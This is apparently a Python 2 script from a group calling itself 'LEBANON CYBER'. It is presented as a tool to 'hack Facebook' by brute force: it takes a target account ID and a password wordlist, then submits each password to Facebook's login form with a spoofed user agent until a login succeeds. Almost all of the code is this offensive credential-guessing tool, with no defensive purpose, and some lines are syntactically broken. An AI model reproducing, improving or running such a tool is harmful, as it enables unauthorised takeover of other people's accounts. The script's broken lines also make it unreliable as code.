#!usr
# -*- coding: UTF-8 -*-
# Mod by: Windows_313
# team: LEBANON CYBER


import os
import sys
import time
import random
import cookielib
import mechanize

wd = "\033[90;1m" # dark
GL = "\033[96;1m" # Blue aqua
BB = "\033[34;1m" # Blue light
YY = "\033[33;1m" # Yellow light
GG = "\033[32;1m" # Green light
WW = "\033[0;1m"  # White light
RR = "\033[31;1m" # Red light
CC = "\033[36;1m" # Cyan light
B = "\033[34m"    # Blue
Y = "\033[33;1m"    # Yellow
G = "\033[32m"    # Green
W = "\033[0;1m"     # White
R = "\033[31m"    # Red
C = "\033[36;1m"    # Cyan

def runntxt(s):
        for noobs in s + '\n':
                sys.stdout.write(noobs)
                sys.stdout.flush()
                time.sleep(10. / 2100)


def banner():
    os.system('clear')
    print " "
    runntxt(GL+"    SHARE THUS TOOLS ^_^")
    runntxt(WW+"   THE TEAM  ")
    runntxt(WW+"     ....       WINDOWS_313")
    runntxt(GL+"         JAYFOX   ")
    runntxt(GG+"     ABU ZENB MUSSAWI")
    runntxt(Y+"          AMIRAL LB*I")
    runntxt(GG+"           JAHIM LB ")
    runntxt(RR+".         THE UNKNOWN CYBER") 
    runntxt(BB+ "           Jelad lb ") 
    runntxt(C+.       Vairus 7x") 
    time.sleep(1.5)
    print GG+"  √=============================================√"
    print GL+"  |••••••   NEW TOOLS HACK FACEBOOK BF.   ••••••|"
    print GG+"  √=============================================√"
    print WW+"  |            MOD BY: THE TEAM            |"
    print GL+"  |       ANONYMOUS     |"
    print WW+"  |        TEAM :  LEBANON CYBER           |"
    print Y+"  |             INSTAGRAM: WINDOWS_313              |"
    print GL+"  |---------------------------------------------|"
    print GL+"  |        LEBANON CYBER.          |"
    print GL+"  |---------------------------------------------|"
    print GG+"  √=============================================√"
    print GL+"  |•••••••••   HACK FACEBOOK ^_^   •••••••••|"
    print GG+"  √=============================================√"

banner()

print wd+"         username of the facebook for hack it"
print GG+"╭────\033[91m[\033[96m THE ID\033[95m / \033[96mUsername Target\033[91m ] "
email_target = str(raw_input(GL+"\033[92m╰────➲\033[93m  "))
print " "
print "\033[92m╭────\033[91m[ \033[File Wordlist from the tools\033[95m( pass.txt ) \033[91;1m]"
password_list = str(raw_input(GG+"╰────➲\033[93m "))
login = 'https://www.facebook.com/login.php?login_attempt=1'
useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geck')]
# useragents = [('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36','Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',)]

def pil():
                print GG+" "
                g = str(raw_input("[?] Hack Fb lagi..\033[93;1m[y/n]: "))
                if g == 'y' or g == 'Y':
                    os.system('python2 brute.py')
                elif g == 'n' or g == 'N':
                    print wd+"Keluar dari program..."
                    sys.exit()
                else:
                    print RR+"Pilih yang bener cuk..."
                    pil()

def edit_wordlist():

        print GG+" "
        ed = str(raw_input("[?] Edit wordlist cuk.? \033[96;1m[y/n]: "))
        if ed == 'y' or ed == 'Y':
                os.system('nano '+password_list)
                pil()
        elif ed == 'n' or ed == 'N':
                print wd+"Keluar Dari Program..."
                sys.exit()

        else:
                print RR+"Pilih yg bener cuk..."
                edit_wordlist()

def main():
        global noobs
        noobs = mechanize.Browser()
        cj = cookielib.LWPCookieJar()
        noobs.set_handle_robots(False)
        noobs.set_handle_redirect(True)
        noobs.set_cookiejar(cj)
        noobs.set_handle_equiv(True)
        noobs.set_handle_referer(True)
        noobs.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
        runn_noobs()
        life()
        print " "
        print RR+" wordlist tidak ada yg cocok..."
        print " "
def iqbalz(iqbalz_password):
  try:
 	sys.stdout.write(GG+"\n[\033[91m+\033[92m]\033[91;1m [\033[97m"+email_target+"\033[91m]\033[90m IS BRUTEFORCED BY THIS PASS==> \033[91m[\033[90;1m"+iqbalz_password)
	sys.stdout.flush()
	noobs.addheaders = [('User-agent', random.choice(useragents))]
	site = noobs.open(login)
	noobs.select_form(nr = 0)
	noobs.form['email'] = email_target
	noobs.form['pass'] = iqbalz_password
	tom = noobs.submit()
	mask = tom.geturl()
	if mask != login and (not 'login_attempt' in mask):
                        print " "
			print ("\033[96m                S U C C E S S")
			print "          P A S S W O R D  F I N D "
                  	print RR+"+-------------------------------------------+"
	         	print (RR+"#\033[97m ID / Email Target:\033[92m {}").format(email_target)
        	        print (RR+"#\033[97m Password Target:\033[92m {}").format(iqbalz_password)
        	        print " "
        	        raw_input(WW+"CLICK ENTER FOR EXIT...")
			sys.exit(1)
  
  
  except KeyboardInterrupt:
      print wd+"Stop......."
      edit_wordlist()
      sys.exit()    	    
def life():
	global iqbalz_password
	password_nob = open(password_list, "r")
	for iqbalz_password in password_nob:
		password_nob = iqbalz_password.replace("\n","")
		iqbalz(iqbalz_password)		

def runn_noobs():
         global password_list

         lop = GG+"""
 ``.:/+osyhhhhhhhhhyso+/:.`
                               .:+ydmdhyso+/:--:./-.--:/+osyhdmhs+:`
                           .+sdmds+/-:osy-````/m-do`.``-mhyo.--/+shmds/.
                       `:sddy+o/-`.-.sm-mh.```:N-hh-.``+No:.--..-y:+:+ydds:`
                    `/ymho-.yosh-``-.:N+/N/```.N/sd-.-.hd+:--.--yh:N+```-ohmy:`
                  -sdho-``.`-yhho.`.``od/ms```.+ss+::::ddhs---.+m/dy.````:+:ohds:
               `:hdso+ss-````+dyoy.``.:+osyooossssssssssyys+/::do/N:````sh/h/./ymd/`
             `/hdo.`+d//do` `-+y-/+ossysyhdmmmNNmmmNNNmmdhhyyssyoso````yh-sh-`.-:omd+.
            :hdo.````:hs/h+`.:+osyydmmNMMMMMMMNm/.yMMMMMMMMMNNmhysso/-:d+hs.` `-/y/smm/
          .smhss+``````/o/:/ssyhmNMMy-+mds+ody:.` +y/:/yNmhmMMMMMNmhoooo+:````-yh/ys-hNs.
        `/dd:/do:`-/````:osshmMMMMmys-`+- . .. -. -` :``o-`::ohdNMMMNmhsso:`.ohoyyy:`.+dd:
       `sNs.``-sho+h-`:osydNMMNmy/:``:``. ..`/-..:y/`.`-: `` .`.shdNMMMNdsso/o:sh:`.:o--ymo`
      `yNo.`//:.-++--ossmMMMMN+.-.`. `/.:+shyhhyyhhhssydy/-. ` --`.:mMMMMMdsso//.:/:-yy/-oNy`
     .hm+..oy++o+.`+ysdMMMMNdyo:`` .:odhyo:-.```   ```.-:+ssoo:.` -oyhmNMMMMdoy+./y++++so-+Nh.
    `hm:`-ys+yyoo:ssyNMNNms:.omms+shy+-`                   `-/so++hNm+.:sNNNMNyss--hs--+h+.+Ny`
   `yN/`:hdyssd//yohMNyoy- -hMMMNd+.                           ./hNMMMy. :hoyNMhoy:-sdhh+oo.+Ns
   oNo.-d+/+yh::yodNm:`d-.+odMMd/`               ``......`       `:hNMho+.:h`/NMdoy:.yhdNmm+`oN+
  -Nh.-hydssd--yodmh+ /h++-oNNo`           `-//++o++++hNmh/`       `+mN+-++h: ohmdoy-.hNmhoh-.hm-
 `hN-`sdoy/d:-ysdm-h-`s:.:yNd-           ./oo/:-.`    `hMMMd:        .hNy-.:o`:y-mhoy--d+/hsh.:Ny
 /Ns`/dmmNNo.oyyM/ h:..+sdMd.         `-/:`         -+yNMMMMN:        `hMmy/../y +Nsyo.+doy+y+.yN:
`hN-`h/oosh-:hoNN. s++s:/Nm.        `:/.        ..-:ymmdddmNo.         `dM+:s+oo .NN+h-.h++hsd.:Ns
.Nh`:doosh+.oyyNm. oy- :mN/        `:`         `-shyhhhhyyso.           -Nm- -y+ -mMsyo.+myy+s/`hm`
:No`:mmNNm--homhyo /``omMd         ..    ``     :MMMMMMMMMMh             yMd+`./ ssdm/h--myysos`oN:
oM:`+y/-+h.:h+N+/N-.-doyMo              -`      +mMMMdyyhhNN`            :Msoh..-N:oN/h:-h+yy+s`/M+
yN-.oo+oyh./h+M+ sh-d/`mM/                    `-`:NMd:+hmNmN.            .Nd`/d-ds oM/h/.yy//oh`:Ms
yN/-y+ss+h./hoMh `yd- /MM/                    `-` .mMm+:+ymN.            .NM: :ds  dM/h/`ss-:od-:Ns
sN/-yyyosh.:h+MN: .y `dmM/                         hMMNMMMMN.            -Nmh` y` /NM/h-`yNNNmh`:Mo
+M+.ssoyod--h+mod+ : sh/My                         hMMMMMMMm`            oN:ho : +dsN/h.`dososh`+M:
:Ny`:dss/d/.ssys.hy-`m/`mN-                        /+dNmsyds            `md +d`-yy.yhos`.d-+++s`yN.
.mm..d//yyh./hoN:`/y+m` yNh`                      .y+ooydNm.            sNs .d+y:`:N+h/`sNNNNm:.mh
 oN/`/mmNNN/.yodN+ `/d` syyo                       :yNMMMd-            +yyo .d/``+Nhoy--d/yohs`+N+
 .md.`soyyyd-:h+mms:`-/ +d`oo`                      /MMm+`            +o.m: /.`:ymm+h/-hy+hyh-.dm.
  oNo`-yos+oy-+ysN+sho:`.m-`sh-                     +h+`            .yo`:m`.:ohsom+y+-+do-:h+`+N+
  `hm-`/h-.:yy-oysm/-+yyoss `hy+.                   ``           `-/yh` ssoys+-+moyo-+hhhhdy`:mh`
   -md.`/yo/-sy-oysmh:``-/y/`-h:+/                              `s+:h.`/y/-``/hmsyo-+dho/sy..dm-
    +Ny.`:h/::-.-+yomNd+:.`..`/y.. ```                           `.y:`-.`.:+dNdsy+-/yo+osy-.hN:
    `oNy.`--.-/yysosshNhossso+/oy/.                             ./y+/+osyhydNysyoy/-:+o+s--ym/
     `+mh-`:yhs/:ys-oyshyo/:-----:-.``..         ````      ..``.-:-----odhyssyh+:+hh+-.---hm/
      `/md:/yoo-.:.`.:so:.-/oo++++ossso-    `    .--.    ` :ossso++++oo+:.:os/+syhddhh+-/dd:
        -hm+/+:.`````:h+so:``.-:///:.`      ``` `...`   .`   `-:///:-```:so/----:syhy//omh-
         `+mh/...```/dysy+os+-`              `.` ```` .``           `-+sy+---.----/y//hmo`
           :yms...-odoo/--.-+so/:.`           ```....``         `.:+oo/:sds:-.-----:smh-
            `/hdo/ys-..``..:ds++/oo+/-.`    ``.```````..`  `.-/+sss/`.--:yhds:----smd/`
              `/hds:` ```.+ds/m+`../sssoo+//:-......--::/+ooo+/+dhs/...--+dyyh//sdd+.
                `/ymy/---smohd/`--.+Nhhs:///soso+o+++++osyy+..--hho+-....-oy-ohmy/`
                  `-odmyoyohd+----/Nd+:.---/N:ds`.```..:+dh.``.-:md/::---:+ymdo-`
                     ./sdmys/:---:dd++-----ym/mo```````.`sm.``.--/mddy/ohmdo:`
                        `:+hmdhs++hdh+----.dy+N:`````....-N/`..--:oyhddy+-`
                           `.:+shmdhhs+/:--h++m.```..-----o+/oyhdmhs+-``
                                 .-/oyhddmdhhhhysssyyhhhddddys+:-.````.`.-://///::::-..`` \033[91;1m
                \033[90;1mANONYMOUS\033[91;1m
             Powered by:\033[97m LEBANON CYBER
      """


         print lop
         nuub = open(password_list, 'r')
         nuub = nuub.readlines()
         print wd+" [#] ID / Username Target\033[97;1m: {}".format(email_target)
         print wd+" [#] JUmlah Password saat ini\033[97;1m:", len(nuub),'password'
         print wd+" [#] Tunggu Proses Cracking\033[97;1m.........."
         print " "

if __name__=='__main__':
	main()	
